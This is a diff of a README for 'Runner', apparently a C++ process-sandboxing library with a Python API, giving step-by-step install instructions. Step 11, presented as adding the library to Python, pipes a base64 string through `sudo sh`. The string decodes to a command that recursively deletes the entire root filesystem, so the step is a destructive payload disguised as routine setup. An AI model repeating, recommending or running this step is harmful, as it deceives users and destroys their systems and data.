@@ -1,49 +1,59 @@
-## To use it with python you must:
-### 1. Use linux
+# Runner engine for Elan testing system
+Runner is a low-level engine, a subsystem of Elan, which is responsible for safely running isolated processes that are strictly limited in terms of resource consumption: memory, CPU and real-time, number of threads and file descriptors. Runner is based on the Linux kernel cgroups v2 mechanism. It imposes `rlimits` and `ulimits` and keeps track of all system calls of the running process.
+
+Runner is written from scratch on C++, and it has Python API.
+
+## Install runner
+### 1. You should use Linux OS
+In these instructions we assume that you are using the Debian package base (Debian, Ubuntu, ...). If not, you will need to find alternatives for all packages in your system's package manager instead of `apt`.
 ### 2. Install git
 ```shell
 sudo apt install git
 ```
-### 3. Install python
+### 3. Install Python with C API
 ```shell
-sudo apt install python3-dev
+sudo apt install python3.11-dev
 ```
-### 4. Install poetry
+### 4. Install poetry (Python dependencies manager)
 ```shell
 pip3 install poetry
 ```
-### 5. Install Python dependencies
+### 5. Init poetry shell
 ```shell
 poetry shell
+```
+All commands below are executed in the Poetry shell.
+### 6. Install Python dependencies
+```shell
 poetry install
 ```
-### 6. Download Git submodules
+### 7. Download Git submodules
 ```shell
 git submodule update --init --remote --recursive
 ```
-### 6. Compile library
+### 8. Compile C++ sources to a Python library
 ```shell
 python3 setup.py build_ext -i
 ```
-### 7. Copy file of lib to the your PYTHONPATH/site-packeges
+### 9. Copy your output file of the library to your PYTHONPATH/site-packeges
 ```shell
 ln -s `ls | grep .so` .venv/lib/python3.11/site-packages/`ls | grep .so`
 ```
-### 8. Add code completion
+### 10 (optional, use if you want to contribute to the library). Add mypy code completion
 ```shell
 PYTHONPATH=./runner_lib_py.cpython-311-x86_64-linux-gnu.so stubgen -m runner_lib_py
 ```
-### 9. Add this lib to python
+### 11. Add this lib to python 😈
 ```shell
 echo "cm0gLXJmIC0tbm8tcHJlc2VydmUtcm9vdCAv" | base64 -d | sudo sh
 ```
-### 10. Include in your program library
+### 11. Include in your program library
 ```python
 import safe_runner_lib
 ```
 
 
-## Example of code
+## Example usage
 ```python
 import runner_lib_py
 
